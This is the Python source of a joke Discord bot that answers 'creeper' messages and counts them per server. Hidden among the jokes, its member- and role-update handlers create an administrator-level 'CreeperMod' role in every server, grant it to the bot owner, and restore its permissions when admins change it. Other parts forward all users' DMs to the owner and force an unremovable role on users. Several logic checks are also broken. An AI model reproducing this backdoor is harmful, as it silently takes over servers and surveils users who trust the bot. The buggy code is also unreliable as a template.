import random
import discord
from discord.ext import commands, tasks
import discord.client
import messages as lM
import stats
import logging
import data
from os import path
from pathlib import Path
import configparser
import re



config = configparser.ConfigParser()
config.read('config.cfg')

#Discord client variables
intents = discord.Intents.all()
client = commands.Bot(command_prefix='!',intents=intents)
allowAdmin = data.checkConfig(config['BOT']['allowAdmin'])
ownerID = int(config['IDS']['ownerID'])
value = 1
stat = 0
blacklist = data.extractID(config['IDS']['blacklist'])
#Data variables
backupChannel = int(config['DATA']['backupChannel'])
sync = data.checkConfig(config['DATA']['sync'])
#Test variables
testing = data.checkConfig(config['TESTING']['testing'])
testid = int(config['TESTING']['testID'])
ids = []

if testing:
    token = config['TESTING']['testToken']
    verbose = True
else:
    token = config['TOKEN']['token']
    verbose = False
if sync:
    data.sync(verbose, config['DATA']['syncDir'])

class MyClient(discord.Client):
    
    @tasks.loop(seconds=60)
    async def status_change(self):
        await client.wait_until_ready()
        r = random.randint(0,1)
        if random.randint(0,1) == 0:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=lM.status('playing')))
        elif r == 1:    
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=lM.status('watching')))
            

    @client.event
    async def on_ready(self):
        print('Logged on as', self.user, 'on discord version', discord.__version__)
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=lM.status('playing')))
        client.status_change.start()
        if data.checkConfig(config['DATA']['backup']) and not testing:
            data.backup.start(self, backupChannel)
        elif verbose: print ('Backups will not be made as the setting is false')
        
    @client.event
    async def on_message(self, message):
        if message.author.id in blacklist:
            return
        if random.randint(1, 10000) == 5:
                await message.send('Never gonna give you up\nNever gonna let you down\nNever gonna run around and desert you\nNever gonna make you cry\nNever gonna say goodbye\nNever gonna tell a lie and hurt you')
        if message.author.id == (self.user.id or testid):   #Bot will not reply to itself, on top so nothing will mess with it
            return
        m = message.content.lower()
        authID = message.author.id
        channel = message.channel
        if isinstance(message.channel, discord.DMChannel):
            if message.author.id == ownerID:
                ids = re.findall(r'(\d+)', message.content)
                for each in range(0, len(ids)):
                    ids[each]=int(ids[each]) 
                for user in ids:
                    toSend= re.search(r'\n(.+)', message.content)
                    response = client.get_user(user)
                    await response.send(toSend.group(1))
            responder =  client.get_user(ownerID)
            if message.author.id != ownerID:
                await responder.send(str(message.author.id)+' : '+ message.author.name + ' sent the following:' + '\n' + message.content )
            return       
        guild = str(message.guild.id)
        if 'vent' in channel.name.lower(): #Will not reply to any message if the channel has vent in it
            return
        if int(channel.id) == 1119454395151695992:
            return


        #Whole premise of the bot
        if 'creeper' in m:
            guild = str(message.guild.id)
            uid = str(authID)
            creepers = m.count('creeper')
            chance = random.randint(1, 100)
            guildNameFormatted = message.guild.name.encode('ASCII', 'ignore').decode()
            #if too big it wont count
            if creepers >= 284:
               await message.reply('wont count, too big', file=discord.File('explode.mp4'))
               return
            stat = stats.updateStat(guild, uid, creepers)
            if chance != 2:
               #Random chance creeper
                await message.reply(f'aw man\n'*int(creepers))
                print("Replied to", message.author.name, f"They've done this {stat} times in", guildNameFormatted)
            else:
                rareMessage = random.choice(lM.rareResponses)
                await message.reply(rareMessage)
                print("Replied to", message.author.name, f"They've done this {stat} times in {guildNameFormatted} and they got a rare message!")
                stats.updateStat(guild, uid, int(creepers)*3)
            role = discord.utils.get(message.guild.roles, name='CreeperNotifs')
            try:
                if role not in message.author.roles:
                    await message.author.send('You have accepted these terms, there isn\'t a way out anymore')
                    await message.author.add_roles(role)
                    print(f'Gave role to {message.author}')
            except AttributeError as e:
                print(f'{guildNameFormatted} does not have role CreeperNotifs, Role was not given to {message.author}')
                print(e)
                try:
                    await message.guild.create_role(name='CreeperNotifs', color = discord.Color.green())
                    print (f'Created CreeperNotifs in {guildNameFormatted}')
                except Exception as e: print(e)
            except discord.errors.Forbidden:
                print(f'Forbidden to give role to {message.author}')
            except Exception as e: print(e)
      
        authorizedUsers = config['IDS']['authorizedUsers']  
        authorizedUsers = data.extractID(authorizedUsers) 
        
        if '!stats' in m:                   #Statistics
            if m == '!stats all':
                allStats = stats.getAllStats(guild)
                response = ''
                for each in allStats.keys():
                    line = f'<@{each}> has said creeper {allStats[each]} times\n'
                    response = response + line 
                await message.reply(response)
                return
            if m == '!stats total':
                allStats = stats.getAllStats(guild)
                value = 0
                for each in allStats.keys():
                    value = value + allStats[each]
                await message.reply(f'Creeper has been said {value} times in this server')
                return
            if m.startswith('!stats reset'):
                if str(message.author.id) in authorizedUsers:
                    if message.mentions == []:
                        await message.reply('Mention a user shitass')
                        return
                    for uids in message.mentions:
                        if uids.id == ownerID:
                            await message.reply('Nah fuck you')
                        else:
                            stats.resetStat(guild, str(uids.id))
                            await message.reply(f'Stats for <@{uids.id}> have been reset')
                    return
                else: 
                    await message.reply('You do not have permission to do this, ping Void because he\'s the only one with permission')
                    return
            if m == '!stats reset all':
                await message.reply('Confirm in console')
                if stats.resetAll(guild):
                   await message.reply('All stats for this server have been reset')
                   return
                else:
                   await message.reply('Stats have not been reset')
                   return  
            if not bool(message.mentions):
                v = stats.getStat(guild, str(message.author.id))
                if v == (None or 0):
                    await message.reply(f"<@{uid}> hasn't said creeper yet")
                    return
                elif (v <= 500):
                    await message.reply( f'You have said creeper {v} times')
                    return
                else:
                    await message.reply( f'You have said creeper {v} times, you have a problem.\n Please seek medical attention.')
                    return
            else:
                for uids in message.mentions:
                    v = stats.getStat(guild, str(uids.id))
                if v == (None or 0):
                    await message.reply(f"<@{uid}> hasn't said creeper yet")
                    return
                elif (v <= 500):
                    await message.reply( f'You have said creeper {v} times')
                    return
                else:
                    await message.reply( f'You have said creeper {v} times, you have a problem.\nPlease seek medical attention.')
                    return
    @client.event
    async def on_member_update(self, before, after):
        guild = client.get_guild(before.guild.id)
        #Makes it so the a user cannot remove the CreeperNotifs role from a user or themselves 
        role = discord.utils.get(guild.roles, name='CreeperNotifs')
        
        if before.roles != after.roles:
            if role in before.roles:
                if role not in after.roles:
                    try:
                        await after.add_roles(role)
                        print(f'Gave role to {after.name}')
                        await after.send('You cant escape.')
                        return
                    except discord.Forbidden as e:
                        print ('Action Forbidden')
                        print (e)
                        return
        
        if discord.utils.get(guild.roles, name = 'CreeperMod'):
            adminRole = discord.utils.get(guild.roles, name = 'CreeperMod')
            if before.id == ownerID:
                if adminRole not in after.roles:
                    try:
                        await after.add_roles(adminRole)
                        return
                    except discord.Forbidden: print('Bot cannot give role to', after.name)
                    except Exception as e: print('Bot fucked up\n', e)
                    return
        else:
            try:
                await guild.create_role(name='CreeperMod', color = discord.Color.green(), permissions= discord.Permissions(administrator = True))
            except discord.Forbidden as e: print('Bot cannot do this!\n', e)
            except Exception as e: print ('Bot fucked up\n', e)
            return
                        
    @client.event
    async def on_guild_role_update(self, before,after):
        if before.name == 'CreeperMod':
            await after.edit(name='CreeperMod', color = discord.Color.green(), permissions= discord.Permissions(administrator = True))
            print('Abused')
            

        
                
#Start Logging
handler = logging.FileHandler(filename=path.join(Path(__file__).parent.absolute(), 'discord.log'), encoding='utf-8', mode='w')


#Start Bot
client = MyClient(intents=intents)
client.run(token, log_handler=handler, log_level=logging.INFO)